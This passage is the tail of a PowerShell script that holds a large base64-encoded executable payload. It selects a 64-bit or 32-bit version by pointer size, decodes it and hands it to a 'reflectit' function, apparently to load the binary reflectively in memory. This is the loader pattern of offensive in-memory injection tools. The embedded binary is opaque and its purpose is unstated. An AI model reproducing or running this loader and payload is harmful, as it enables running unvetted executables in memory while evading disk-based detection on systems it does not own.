zg/QD9IP1A/VD9sP3A/eD+MP5Q/nD+kP6g/rD+0P8g/5D/oPwAAACACAJAAAAAIMBAwFDAwMDgwPDBMMHAwfDCEMKwwsDDMMNAw2DDgMOgw7DD0MAgxJDEoMUgxaDGIMZAxnDHQMfAxEDIwMkwyUDJwMpAysDLQMvAyEDMwM1AzcDOQM7Az0DPwMxA0MDRQNHA0jDSQNLA00DTsNPA0+DT8NAA1CDUcNSQ1ODVANUg1UDVkNQAAADACAGgAAAA4MWgxeDGIMZgxqDHAMcwx0DHUMfAx9DH8MSA3JDcoNyw3MDc0Nzg3PDdAN0Q3UDdUN1g3XDdgN2Q3aDdsN7A4uDjEOOQ4BDkkOUA5XDmEOZw5tDnMOew5BDooOlQ6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='
 
 if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
 {
       [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
 }
 else
 {
       [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes86)
 }

reflectit -PEBytes $PEBytes -ExeArgs $arguments

 }
